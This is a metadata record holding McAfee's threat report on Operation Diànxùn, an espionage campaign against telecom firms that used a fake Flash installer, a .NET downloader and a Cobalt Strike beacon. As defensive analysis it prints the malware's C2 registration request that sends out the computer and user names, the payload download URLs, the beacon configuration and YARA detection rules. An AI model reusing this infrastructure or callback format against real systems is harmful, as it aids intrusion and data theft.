{
    "id": "0837e099-b7b0-454d-9079-36d4aee0d139",
    "created_at": "2022-10-25T16:48:22.072099Z",
    "updated_at": "2025-03-27T02:16:47.084281Z",
    "deleted_at": null,
    "sha1_hash": "e123bc949e114983c6c8e297fcf8be6ed519d9d0",
    "title": "Technical Analysis of Operation Diànxùn",
    "authors": "",
    "file_creation_date": "2021-03-15T22:40:37Z",
    "file_modification_date": "2021-03-15T22:46:40Z",
    "file_size": 1722346,
    "plain_text": "# T e c h n i c a l\n\n A n a l y s i s o f\n\n O p e r a t i o n\n\n D i à n x ù n\n\n\n-----\n\n### Table of Contents\n\n##### 7 Summary of Findings\n\n 8 Victimology\n\n 8 Telemetry\n\n 8 Attack Overview\n\n 10 Stage 1: Fake Flash Application\n\n 12 Stage 2: DotNet Utility\n\n 13 DLL Intermediary for Adding Scheduled Task\n\n 14 Stage 3: Cobalt Strike Payload\n\n 16 Infrastructure Analysis\n\n 17 MITRE ATT&CK Matrix\n\n 18 Conclusion\n\n\n##### 19 IOCs\n\n 19 Stage 1: Fake Flash 19 Stage 1: Other 19 Stage2: Downloader Utility 20 AddTaskPlanDllVerson.dll 20 Stage3: Cobalt Strike Beacon 20 URLs 20 Cobalt Strike Malleable C2\n\n 21 YARA Rules\n\n 24 About McAfee\n\n 24 McAfee ATR\n\n 24 Additional Resources\n\n\n-----\n\n### Introduction\n\n#### In this report the McAfee® Advanced Threat Research (ATR) Strategic Intelligence team details an espionage campaign, targeting telecommunication companies, dubbed Operation Diànxùn.\n\n In this attack, we discovered malware using similar tactics, techniques, and procedures (TTPs) to those observed in earlier campaigns publicly attributed to the threat actors RedDelta and Mustang Panda. While the initial vector for the infection is not entirely clear, we believe with a medium level of confidence that victims were lured to a domain under control of the threat actor, from which they were infected with malware which the threat actor leveraged to perform additional discovery and data collection. We believe with a medium level of confidence that the attackers used a phishing website masquerading as the Huawei company career page to target people working in the telecommunications industry.\n\n We discovered malware that masqueraded as Flash applications, often connecting to the domain “hxxp://update.careerhuawei.net” that was under control of the threat actor. The malicious domain was crafted to look like the legitimate career site for the technology company Huawei, which has the domain; career.huawei.com. In December we also observed a new domain name used in this campaign: hxxp://update.huaweiyuncdn.com.\n\n Moreover, the sample masquerading as the Flash application used the malicious domain name “hxxp://flach.cn” which was made to look like the official web page for China to download the Flash application, flash.cn. One of the main differences from past attacks is the lack of use of the PlugX backdoor. However, we did identify the use of a Cobalt Strike backdoor.\n\n\n###### Authors\n\n This report was researched\n and written by:\n\n- Thomas Roccia\n\n- Thibault Seret\n\n- John Fokker\n\n###### Subscribe to receive threat information.\n\nConnect With Us\n\n\n-----\n\n#### By using McAfee’s telemetry, possible targets based in Southeast Asia, Europe, and the US were discovered in the telecommunication sector. Combined with the use of the fake Huawei site, we believe with a high level of confidence that this campaign was targeting the telecommunication sector. We believe with a moderate level of confidence that the motivation behind this specific campaign has to do with the ban of Chinese technology in the global 5G roll-out.\n\n Activity linked to the Chinese group RedDelta, by peers in our industry, has been spotted in the wild since early May 2020. Previous attacks have been described targeting the Vatican and religious organizations.\n\n In September 2020, the group continued its activity using decoy documents related to Catholicism, Tibet-Ladakh relations, and the United Nations General Assembly Security Council, as well as other network intrusion activities targeting the Myanmar government and two Hong Kong universities. These attacks mainly used the PlugX backdoor using DLL side loading with legitimate software, such as Word or Acrobat, to compromise targets.\n\n While external reports have given a new name to the group which attacked the religious institutions, we believe, based on the similarity of TTPs, that both attacks can be attributed to one known threat actor: Mustang Panda. \n\n How can you defend your organization as effectively as possible from an attack of this type, which involves different techniques and tactics and potential impact?\n\n\nConnect With Us\n\n\n-----\n\n#### Below is a summary of how McAfee’ Security Architecture helps you protect against the tactics and techniques used in Operation Dianxun.\n\n|Preparation|M ca Acquire Infrastructure: Develop capabilities: Fake flach.cn, careerhuawei.net Flash and DotNet Malware Obtain capabilities: Cobalt Strike Tool (T1588.002) M Domains (T1583.001) (T1587.001) d in Br u w User Execution: Malicious Link (T1204.001) M an de M m Scheduled Task/Job: Create or Modify System Cobalt Strike Defense Evasion: de DotNet Creates Scheduled Task Process: Windows Service Process Injection (T1055) (T1053.005) (T1543.003) M U Use Application Layer Protocol: do Web Protocols (T1071.001) https://update1.jscachecdn.com/... M https://update1.jscachecdn.com/... Attacker C&C Servers C2 M Hi do Access sensitive data and exfiltrate|VISION Insights tracks mpaign indicators cAfee MWG - MVISION UCE etects malicious link and spect flash payload. Remote owser Isolation on ncategorized zero-day ebsite blocks delivery cAfee ENS detects indicators d techniques to proactively tecting the threat VISION EDR can detect alicious Persistence and fense evasion techniques cAfee Web Gateway and CE will detect known C2 mains cAfee NSP will detect known domains VISION EDR Real Time and storical Search for C2 mains and hash indicators|\n|---|---|---|\n|Delivery|||\n|Exploitation & Persistence Command & Control Actions on Objective|||\n\n\nConnect With Us\n\n\n-----\n\n#### We believe the best way to protect yourself from this type of attack is to adopt a multi-layer approach including McAfee® MVISION™ Insights, McAfee® Web Gateway, MVISION™ UCE, and MVISION™ EDR.\n\n MVISION Insights can play a key role in risk mitigation by proactively collecting intelligence on the threat and your exposure.\n\n McAfee Web Gateway and MVISION UCE provide multi-layer web vector protection with URL Reputation check, SSL decryption, and malware emulation capabilities for analyzing dangerous active Web content such as Flash and DotNet. MVISION UCE also includes the capabilities of Remote Browser Isolation, the only solution that can provide 100% protection during web browsing.\n\n McAfee® Endpoint Security (ENS) running on the target endpoint protects against Operation Dianxun with an array of prevention and detection techniques. ENS Threat Prevention and ATP provides both signature and behavioral analysis capability which proactively detects the threat. ENS also leverages Global Threat Intelligence which is updated with known IoCs. For DAT based detections, the family will be reported as Trojan-Cobalt, Trojan-FSYW, Trojan- FSYX, Trojan-FSZC, and CobaltStr-FDWE.\n\n As the last phase of the attack involves creating a backdoor for remote control of the victim via a Command and Control Server and Cobalt Strike Beacon, the blocking features that can be activated on a Next Generation Intrusion Prevention System solution such as McAfee NSP are important, NSP includes a Callback Detection engine and is able to detect and block anomalies in communication signals with C2 Servers.\n\n MVISION EDR can proactively identify persistence and defense evasion techniques. You can also use MVISION EDR to search the indicators of compromise in Real-Time or Historically (up to 90 days) across enterprise systems.\n\n\nConnect With Us\n\n\n-----\n\n## Technical Analysis of Operation Diànxùn\n\n\n##### Summary of Findings\n\n###### We assess with a high level of confidence that:\n\n- Recent attacks using TTPs similar to those of the\n\n###### Chinese groups RedDelta and Mustang Panda have been discovered.\n\n- Multiple overlaps including tooling, network, and\n\n###### operating methods suggest strong similarities between Chinese groups RedDelta and Mustang Panda. \n\n- The targets are mainly telecommunication companies\n\n###### based in Southeast Asia, Europe, and the US. We also identified a strong interest in German, Vietnamese, and India telecommunication companies.\n\n\n###### We assess with a moderate level of confidence that:\n\n- The motivation behind this specific campaign could be\n\n###### to do with the ban of Chinese technology in the global 5G roll-out.\n\n- We believe that this espionage campaign is aimed at\n\n###### stealing sensitive or secret information in relation to 5G technology.\n\n PLEASE NOTE: We have no evidence that the technology company Huawei was knowingly involved in this Campaign.\n\n\nConnect With Us\n\n\n-----\n\n##### Victimology\n\n###### Based on the detections we have identified via our telemetry, the use of a fake website made to look like the career site of a major technology company and the operating method showing extensive overlap to the threat group Mustang Panda, we believe with a high level of confidence that this cyberespionage campaign was targeting the telecommunications sector. Several of these companies have shown a strong interest in the roll out of 5G technology.\n\n To put things in perspective, the 5G race is primarily about leading on 5G installation and thus communication worldwide. Huawei, the Chinese company, is currently one of the leaders in this field.\n\n##### Telemetry\n\n###### We have observed telemetry hits in several countries across the globe. The map below shows an overview of the detection from our telemetry. Below we will highlight some of the specific countries that had telemetry hits.\n\n\n##### Attack Overview\n\n###### It is possible that the fake Huawei website “hxxp:\\\\update.careerhuawei. net” has been used as an initial vector to trick targets and redirect them to the fake Flash website.\n\n The following diagram shows an overview of the infection process.\n\n The first stage is masquerading as the Flash application. A phishing page has been created using the exact same appearance as the original website. As the website is masquerading as the official download page, we believe that it has been used in a phishing attack. It is likely that the targeted users have been redirected to this malicious website.\n\n\n-----\n\n###### Legitimate Website: Flash.cn\n\n Malicious Website: Flach.cn\n\n\n###### The malicious website is hosting several additional samples. Subdomains are the following:\n\n**Domain** **Description**\n\ndownload.flach.cn Contains the main executable\n\nmobile.flach.cn Contains base64 encoded Cobalt Strike Payload\n\ninfo.flach.cn Unknown\n\nupdate.flach.cn Used to register the compromised machines and contains Dotnet\npayload version 2.0 and 4.0\n\nforum.flach.cn Unknown\n\nm.flach.cn Unknown\n\nterminal.flach.cn Unknown\n\n###### The malicious application can be downloaded from “hxxp://update.flach. cn/downloads/flashplayer_install_cn.exe”.\n\n We have noted that some of the samples have a connection to the domain “update.careerhuawei.net”, which provides further indication about the targets.\n\n\n-----\n\n##### Stage 1: Fake Flash Application\n\nFile type PE32+ executable (GUI) x86-64, for MS Windows\n\nFile name flashplayer_install_cn.exe\n\nFile size 920576B\n\nCompile time 2020-08-17 13:17:10\n\nImport Hash 5f7ca61a772049e7c494c6c74d69484c\n\nHash SHA256 9ccb4ed133be5c9c554027347ad8b722f0b4c3f14bfd947edfe75a015bf085e5\n\n###### The sample discovered acts as a downloader. It masquerades as the Flash application.\n\n\n###### The sample first checks the time and the geolocalization of the infected machine via a request to http://worldclockapi.com/api/json/est/now.\n\n It then registers the infected machine with a hardcoded token.\n\n\n-----\n\n###### The following request demonstrates the machine registering to the c2 with the hardcoded token “zheshiyigetoken23333333333”.\n\n```\nGET /callback.php?token=zheshiyigetoken23333333333&computername=us­\ner-PC&username=user HTTP/1.1\n\n```\nHost: update.flach.cn\n```\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb­\nKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\n\n```\n\n###### Then the sample checks if Dotnet framework 2.0 or 4.0 is installed and downloads the second stage accordingly.\n\n```\nGET /download.php?api=40 HTTP/1.1\n\n```\nHost: update.flach.cn\n```\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb­\nKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept: */*\n\n```\n\n-----\n\n##### Stage 2: DotNet Utility\n\n###### The second stage is a DotNet payload that is executed. This payload contains several functions and acts as a utility to further compromise the machine. This is a tool to manage and download backdoors to the machine and configure persistence.\n\nFile type PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\nFile name DotNetLoader20.exe\n\nFile size 36352B\n\nCompile time 2098-06-18 21:19:52\n\nImport Hash f34d5f2d4577ed6d9ceec516c1f5a744\n\nHash SHA2 480a8c883006232361c5812af85de9799b1182f1b52145ccfced4fa21b6daafa\n\nFile type PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\nFile name DotNetLoader40.exe\n\nFile size 36352B\n\nCompile time 2072-02-12 03:42:09\n\nImport Hash f34d5f2d4577ed6d9ceec516c1f5a744\n\nHash SHA2 7ea7c6406c5a80d3c15511c4d97ec1e45813e9c58431f386710d0486c4898b98\n\n\n###### The below bullet points summarize the functionalities:\n\n- It checks if the 360tray.exe (360 AV) process is running.\n\n- It can re-download the first stage from hxxp://update.flach.cn/download.\n\n###### php?raw=1.\n\n- It creates a scheduled task that will run cmd.exe /c with the previous\n\n###### payload downloaded and create the registry key SOFTWARE\\\\ Microsoft\\\\Windows. NT\\\\CurrentVersion\\\\AppCompatFlags\\\\ TelemetryController\\\\Levint.\n\n- It can download a Cobalt Strike payload base64 encoded and stored on a\n\n###### remote address. If this option is selected the payload will be copied in the TEMP folder with the name FlashUpdate.exe.\n\n- It checks if the task “WpsUpdataTask_” is present and downloads\n\n###### an additional utility from hxxp://159.138.84.217:81/c0c00c0c/ AddTaskPlanDllVerson.dll.\n\n- It checks if the task “FlashUpdate” is present in the system and, if not,\n\n###### can create it.\n\n- It can add a WMI backdoor by creating a permanent filter in order to stay\n\n###### persistent in the infected machine.\n\n- It has the possibility to inject a shellcode into the clipboard using this\n\n###### technique: https://search.unprotect.it/technique/clipbrdwndclass/.\n\n\n-----\n\n##### DLL Intermediary for Adding Scheduled Task\n\n###### It is currently unclear for what exact purpose this DLL has been created. This sample has the ability to create a scheduled task, as does the DotNet utility.\n\nFile type PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\nFile name AddTaskPlanDllVerson.dll\n\nFile size 23552B\n\n\nCompile\ntime\n\nImport\nHash\n\n\n2020-08-14 11:19:44\n\n0f275d628096389203c13780013332e4\n\n\nHash SHA2 2779937398506e8ad207f5b291ae53d8af82b9f2739b0508ae3e0cfc40ced092\n\n###### The sample contains only one export named “GO”, which is called when executed.\n\n\n###### The main goal of this tool is to check if the file “flashupdate_exe” is available in the temp folder (meaning the first stage has been successful).\n\n Then it creates a scheduled task called “WpsUpdataTask_” to run the sample in the infected machine.\n\n\n-----\n\n##### Stage 3: Cobalt Strike Payload\n\n###### The fourth stage of the attack is a Cobalt Strike beacon payload. This payload is downloaded with the DotNet utility from the address “mobile. flach.cn”. The payload is a gzip file which is base64 encoded then decompressed and injected.\n\n The following screenshot, extracted from the DotNet utility, shows the code used to decompress and execute the remote payload.\n\n\n###### The Cobalt Strike payload has the following information:\n\nFile type PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\nFile name beacon.bin\n\nFile size 267264B\n\n\nCompile\ntime\n\nImport\nHash\n\n\n2019-05-04 01:01:46\n\n5d58634383b49de64bde0ee76012a61a\n\n\nHash SHA2 4ae0a22033f03813645a0f9363eb44d8220119c94967b8188cb3c22de33027f0\n\n###### We extracted the following configuration from this payload:\n\nBeaconType HTTPS\n\nPort 443\n\nSleepTime 6800\n\nMaxGetSize 1048576\n\nJitter 14\n\nMaxDNS 245\n\nC2Server update1.bootcdn.org,/s/ref=nb_sb_noss_1/26484198498-9827145/field-keywords=woman\n\nUserAgent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)\n\nHttpPostUri /N9185/adj/amzn.us.sr.aps\n\nMalleable_C2_Instructions Empty\n\nHttpGet_Metadata Accept: */*\n\nHost: www.amazon.com\n\nsession-token=\n\nskin=noskin;\n\ncsm-hit=s-ZKfVNrTuJP09EG9Fzz9I|2083152134315\n\nCookie\n\n\n-----\n\nHttpPost_Metadata Accept: */*\n\nContent-Type: text/xml\n\nX-Requested-With: XMLHttpRequest\n\nHost: www.amazon.com\n\nsz=160x600\n\noe=oe=ISO-8859-1;\n\nsn\n\ns=8967\n\ndc_ref=http%3A%2F%2Fwww.amazon.com\n\nSpawnTo b’\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x00\\x00’\n\nPipeName\n\nDNS_Idle 0.0.0.0\n\nDNS_Sleep 0\n\nSSH_Host Not Found\n\nSSH_Port Not Found\n\nSSH_Username Not Found\n\nSSH_Password_Plaintext Not Found\n\nSSH_Password_Pubkey Not Found\n\nHttpGet_Verb GET\n\nHttpPost_Verb POST\n\nHttpPostChunk 0\n\nSpawnto_x86 %windir%\\syswow64\\rundll32.exe\n\nSpawnto_x64 %windir%\\sysnative\\rundll32.exe\n\nCryptoScheme 0\n\n\nProxy_Config Not Found\n\nProxy_User Not Found\n\nProxy_Password Not Found\n\nProxy_Behavior Use IE settings\n\nWatermark 6\n\nbStageCleanup False\n\nbCFGCaution False\n\nKillDate 0\n\nbProcInject_StartRWX True\n\nbProcInject_UseRWX True\n\nbProcInject_MinAllocSize 0\n\nProcInject_PrependAppend_x86 Empty\n\nProcInject_PrependAppend_x64 Empty\n\nProcInject_Execute CreateThread\n\nSetThreadContext\n\nCreateRemoteThread\n\nRtlCreateUserThread\n\nProcInject_AllocationMethod VirtualAllocEx\n\nbUsesCookies True\n\nHostHeader Not Found\n\n###### We extracted another similar payload making a request to the C2: “hxxps:// update1.jscachecdn.com/s/ref=nb_sb_noss_1/264-84198498-9827145/ field-keywords=woman”.\n\n\n-----\n\n##### Infrastructure Analysis\n\n###### The below diagram shows in a broader view the architecture used by the attackers, as well as the connection between the different domains.\n\ncareerhuawei.net\n\nupdate.careerhuawei.net hr.careerhuawei.net boot.careerhuawei.net info.careerhuawei.net infoadmin.careerhuawei.net\n\nMustang Panda Stage 1\n\neb4c6ad5dfabdc7be32b1eb1b5c47a2c\n\nRedDelta .NET Loader\n\n###### By looking at the infrastructure used by the attackers, we see the IPs hosting the campaign have previously been used by the Mustang Panda threat actor to drop stagers and Cobalt Strike payloads related to previous campaigns.\n\n\n-----\n\n##### MITRE ATT&CK Matrix\n\n\n-----\n\n**Tactic** **Technique** **Observable** **IOCs**\n\n\nResource Development Acquire Infrastructure: Domains (T1583.001) Attackers purchased domains to develop their\nphishing attack.\n\nDevelop capabilities: Malware (T1587.001) Attackers built malicious components to conduct\ntheir attack.\n\nObtain capabilities: Tool (T1588.002) Attackers acquired red teaming tools to conduct their\nattack.\n\nInitial Access Spear phishing Link (T1566.002)\n\nExecution User Execution (T1204.001) Users are redirected to the Fake Flash website to\ndownload the first stage.\n\nPersistence Scheduled Task/Job: Scheduled Task (T1053.005) The DotNet Utility creates a scheduled task that will\nrun cmd.exe /c with the previous payload downloaded\nand create registry key.\n\n\n“flach.cn”\n\n“careerhuawei.net”\n\nFake Flash\n\nUtility Downloader\n\nAddTaskPlanDllVersion.dll\n\nCobalt Strike\n\n“SOFTWARE\\\\Microsoft\\\\Windows NT\\\\\nCurrentVersion\\\\AppCompatFlags\\\\\nTelemetryController\\\\Levint”\n\n\nCreate or Modify System Process: Windows Service\n(T1543.003)\n\n\nThe DotNet utility can add a WMI backdoor by\ncreating a permanent filter in order to stay persistent\nin the infected machine.\n\n\nDefense Evasion Process Injection (T1055) The DotNet utility has the possibility to inject\nshellcode into the clipboard.\n\nCommand And Control Application Layer Protocol: Web Protocols\n(T1071.001)\n\n\n##### Conclusion\n\n###### In this report we have brought to light a recent espionage operation allegedly attributed to a Chinese APT group. Regarding the targeted sector (telecoms), we believe that this campaign was used to access sensitive data and to spy on companies related to 5G technology. Additionally, the use of a fake Huawei website gives more clues about the telecom targets. The announcement of the ban on Huawei in several countries could have motivated the operation.\n\n\n###### The operating methods were previously assigned to the Chinese groups Red Delta and Mustang Panda. While we believe that the two actors could be the same, based on similar techniques, tactics, and procedures, we currently have no further evidence. Interestingly, the RedDelta group has previously targeted Catholic organizations, while this campaign is primarily focused on telecommunications.\n\n\n-----\n\n##### IOCs\n\n Stage 1: Fake Flash\n\n\n##### Stage 1: Other\n\n```\na8029680a25fb0144c20fe7637492bcab3c3b320b824735bb02d10babed9c938\n\n```\n```\n422e3b16e431daa07bae951eed08429a0c4ccf8e37746c733be512f1a5a160a3\n8489ee84e810b5ed337f8496330e69d6840e7c8e228b245f6e28ac6905c19f4a\nc0331d4dee56ef0a8bb8e3d31bdfd3381bafc6ee80b85b338cee4001f7fb3d8c\n89a1f947b96b39bfd1fffd8d0d670dddd2c4d96f9fdae96f435f2363a483c0e1\nb3fd750484fca838813e814db7d6491fea36abe889787fb7cf3fb29d9d9f5429\n9ccb4ed133be5c9c554027347ad8b722f0b4c3f14bfd947edfe75a015bf085e5\n4e7fc846be8932a9df07f6c5c9cbbd1721620a85c6363f51fa52d8feac68ff47\n0f2e16690fb2ef2b5b4c58b343314fc32603364a312a6b230ab7b4b963160382\ndb36ad77875bbf622d96ae8086f44924c37034dd95e9eb6d6369cc6accd2a40d\n8bd55ecb27b94b10cb9b36ab40c7ea954cf602761202546f9b9e163de1dde8eb\n7de56f65ee98a8cd305faefcac66d918565f596405020178aee47a3bd9abd63c\n9d4b4c39106f8e2fd036e798fc67bbd7b98284121724c0f845bca0a6d2ae3999\nac88a65345b247ea3d0cfb4d2fb1e97afd88460463a4fc5ac25d3569aea42597\n37643f752302a8a3d6bb6cc31f67b8107e6bbbb0e1a725b7cebed2b79812941f\nd0dd9c624bb2b33de96c29b0ccb5aa5b43ce83a54e2842f1643247811487f8d9\n260ebbf392498d00d767a5c5ba695e1a124057c1c01fff2ae76db7853fe4255b\ne784e95fb5b0188f0c7c82add9a3c89c5bc379eaf356a4d3876d9493a986e343\na95909413a9a72f69d3c102448d37a17659e46630999b25e7f213ec761db9e81\nb7f36159aec7f3512e00bfa8aa189cbb97f9cc4752a635bc272c7a5ac1710e0b\n4332f0740b3b6c7f9b438ef3caa995a40ce53b3348033b381b4ff11b4cae23bd\n\n```\n\n##### Stage2: Downloader Utility\n\n```\n2779937398506e8ad207f5b291ae53d8af82b9f2739b0508ae3e0cfc40ced092\n30b2bbce0ca4cb066721c94a64e2c37b7825dd72fc19c20eb0ab156bea0f8efc\n42ed73b1d5cc49e09136ec05befabe0860002c97eb94e9bad145e4ea5b8be2e2\ncf65cc6e4b2b0c3f602b16398c8c30c277b8cfaed689fe7cb61b92560d4e5b1b\na325bbd32985c1b586486df7d92521224b8b155d464c88d11b1d0068399100c2\n740992d40b84b10aa9640214a4a490e989ea7b869cea27dbbdef544bb33b1048\n4b53a550854cfa65a800d8fb86aab726ca44610dad04325abf5c59f4832d7555\n7ea7c6406c5a80d3c15511c4d97ec1e45813e9c58431f386710d0486c4898b98\ncf4bf26b2d6f1c6055534bbe9decb579ef0180e0f8c467c1a26e2ead7567058a\n05f7fbb63d42bc2e73ef2b935cb6b3c919b7020dc1b80ed58f60484dcbd667a9\n4ccd825cf4a9fdfbea08fb4e4b3ab08e846bc2efb05ccac794e786ec4335cbb4\n8097a623dbcdbd8f880a294fa80c8ea152707f0acd75ab4de158f3abfd4715a3\n0d7d4dc173c88c4f72c8f9f419ae8473d044f4b3e8f32e4a0f34fe4bbc698776\n42ed73b1d5cc49e09136ec05befabe0860002c97eb94e9bad145e4ea5b8be2e2\n\n```\n\n-----\n\n##### AddTaskPlanDllVerson.dll\n\n```\n2779937398506e8ad207f5b291ae53d8af82b9f2739b0508ae3e0cfc40ced092\n75b30164a31d305f47f2c3c2121432e6d7b316cfb3deb6b39f78180168bc9472\na8ef63238100c3837d097671c8e8d2cb4102e137055568fd04613747ba632fdc\n\n```\n\n##### Stage3: Cobalt Strike Beacon\n\n```\na11b6e2b02ae6531dfa85e0e1733a79816b54d2c91fed6526e43b8d07c63020a\n9c9cd78e2d6dc150b98b14c8dc53ab683c0ebd52a438f97b5be3bfd66a309652\n3be627980f2bd07be7ff961637eb73865955760f0039ebf9d440064c54a9034e\nd2642d3731508b52efa34adf57701f18e2f8b70addf31e33e445e75b9a909822\n\n```\n```\nupdate.careerhuawei.net\ncareerhuawei.net\ninfo.careerhuawei.net\nhr.careerhuawei.net\n\n```\nflash-update.buyonebuy.top\n```\n159.138.84.217:81/c0c00c0c/AddTaskPlanDllVerson.dll\nupdate.huaweiyuncdn.com.\nupdate.huaweiyuncdn.com/download.php\ncdn1.update.huaweiyuncdn.com\ncdn.update.huaweiyuncdn.com\ninfoadmin.update.huaweiyuncdn.com\n\n```\n\n##### URLs\n\n\nupdate.flach.cn/flach.php\n\nmobile.flach.cn/flach.php\n\nwww.flach.cn/download.php\n\nupdate.flach.cn/callback.php\n\ndownload.flach.cn\n\ninfo.flach.cn\n\nforum.flach.cn\n\nm.flach.cn\n\nterminal.flach.cn\n\n\n##### Cobalt Strike Malleable C2\n\n```\nupdate1.bootcdn.org/s/ref=nb _ sb _ noss _ 1/264-84198498-9827145/\n\n```\nfield-keywords=woman\n```\nupdate1.jscachecdn.com/s/ref=nb _ sb _ noss _ 1/264-84198498-9827145/\n\n```\nfield-keywords=woman\n\n\n-----\n\n##### YARA Rules\n\n```\nrule APT _ CN _ Stage1\n{\n     meta:\n         description = “Detects Stage1”\n         author = “Thomas Roccia, McAfee ATR”\n         date = “2020-10-14”\n         rule _ version = “v1”\n         malware _ type = “Backdoor”\n         malware _ family = “Unknown”\n         actor _ type = “APT”\n         actor _ group = “China”\n\n```\n```\nstrings:\n     \u0007$s1 = “aHR0cDovL3VwZGF0ZS5jYXJlZXJodWF3ZWkubmV0Ojgx”\n     fullword ascii\n     $s2 = “RunRemoteCode” fullword ascii wide\n     $s3 = “RemoveBD” fullword ascii wide\n     $s4 = “DotNetLoader.Program” wide fullword\n     $s5 = “/download.php?api=40” ascii fullword\n     $s6 = “get %d URLDir” ascii fullword\n     $s7 = “Read code failed” ascii fullword\n     $s8 = “\\\\CLRLoader.exe” wide fullword\n     \u0007$s9 = “/callback.php?token=%s&computername=%s&user­\n     name=%s” ascii fullword\ncondition:\n     (uint16(0) == 0x5A4D)\n     and 5 of them\n\n```\nand filesize < 2000KB\n\n```\n}\n\n```\n\n-----\n\n```\nrule APT _ CN _ Stage2 _ DotNet\n{\n     meta:\n         description = “Detects Stage2”\n         author = “Thomas Roccia, McAfee ATR”\n         date = “2020-10-14”\n         rule _ version = “v1”\n         malware _ type = “Hacking Tool”\n         malware _ family = “Unknown”\n         actor _ type = “APT”\n         actor _ group = “China”\n\n```\n```\nstrings:\n     $s1 = “InjectShellCode” ascii fullword\n     $s2 = “clipboardinject” ascii fullword\n     $s3 = “WMIBackdoor” wide\n     \u0007$s4 = “Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Te­\n     lemetryController\\\\Levint” wide\n     $s5 = “FlashUpdate.exe” wide\n     $s6 = “raw _ cc _ url” ascii fullword\n     $s7 = “AdobeCloud” ascii fullword  \ncondition:\n     (uint16(0) == 0x5A4D)\n     and 4 of them\n\n```\nand filesize < 2000KB\n\n```\n}\n\n```\n\n-----\n\n```\nrule APT _ CN _ DLLAddTask\n{\n     meta:\n         description = “Detects hacking tool”\n         author = “Thomas Roccia, McAfee ATR”\n         date = “2020-10-14”\n         rule _ version = “v1”\n         malware _ type = “Hacking Tool”\n         malware _ family = “Unknown”\n         actor _ type = “APT”\n         actor _ group = “China”\n\n```\n```\nstrings:\n     $s1 = “Taskschd.dll” ascii fullword\n     $s2 = “AddTaskPlanDllVerson.dll” ascii fullword\n     $s3 = “\\\\FlashUpdate.exe” ascii fullword\n     $s4 = “D:\\\\Project\\\\FBIRedTeam” ascii fullword\n     $s5 = “Error %s:%d, ErrorCode: %x” ascii fullword\n     $d1 = “2000-01-01T00:00:01” ascii fullword\n     $d2 = “2099-05-02T10:52:02” ascii fullword\n     $d3 = “PT1H”ascii fullword\ncondition:\n     (uint16(0) == 0x5A4D)\n     and 3 of ($d*) or 4 of them\n\n```\nand filesize < 2000KB\n\n```\n}\n\n```\n\n-----\n\n##### About McAfee\n\n###### McAfee is the device-to-cloud cybersecurity company. Inspired by the power of working together, McAfee creates business and consumer solutions that make our world a safer place. By building solutions that work with other companies’ products, McAfee helps businesses orchestrate cyber environments that are truly integrated, where protection, detection, and correction of threats happen simultaneously and collaboratively. By protecting consumers across all their devices, McAfee secures their digital lifestyle at home and away. By working with other security players, McAfee is leading the effort to unite against cybercriminals for the benefit of all.\n\n www.mcafee.com\n\n6220 America Center Drive\nSan Jose, CA 95002\n888 847 8766\n\n\n##### McAfee ATR\n\n###### The McAfee® Advanced Threat Research Operational Intelligence team operates globally around the clock, keeping watch of the latest cyber campaigns and actively tracking the most impactful cyber threats. Several McAfee products and reports, such as MVISION Insights and APG ATLAS, are fueled with the team’s intelligence work. In addition to providing the latest Threat Intelligence to our customers, the team also performs unique quality checks and enriches the incoming data from all of McAfee’s sensors in a way that allows customers to hit the ground running and focus on the threats that matter.\n\n Subscribe to receive our Threat Information.\n\n\n##### Additional Resources\n\n###### https://twitter.com/IntezerLabs/ status/1316384526323638274?s=20\n\n https://github.com/intezer/community- intellignce/blob/master/RedDelta_IOCs.csv\n\n https://malpedia.caad.fkie.fraunhofer.de/actor/ mustang_panda\n\n https://www.recordedfuture.com/reddelta- targets-catholic-organizations/\n\n McAfee ATR is actively monitoring this threat and will update accordingly.\n\n\nMcAfee and the McAfee logo are trademarks or registered trademarks of McAfee, LLC or its subsidiaries in the US and other countries.\nOther marks and brands may be claimed as the property of others. Copyright © 2021 McAfee, LLC. 4719_0321\nMARCH 2021\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-dianxun.pdf"
    ],
    "report_names": [
        "rp-operation-dianxun.pdf"
    ],
    "threat_actors": [
        {
            "id": "b5449533-0ff1-4048-999d-7d4bfd8e6da6",
            "created_at": "2022-10-25T16:07:24.114365Z",
            "updated_at": "2025-03-27T02:02:10.111256Z",
            "deleted_at": null,
            "main_name": "RedDelta",
            "aliases": [
                "Operation Dianxun",
                "TA416"
            ],
            "source_name": "ETDA:RedDelta",
            "tools": [
                "Agent.dhwf",
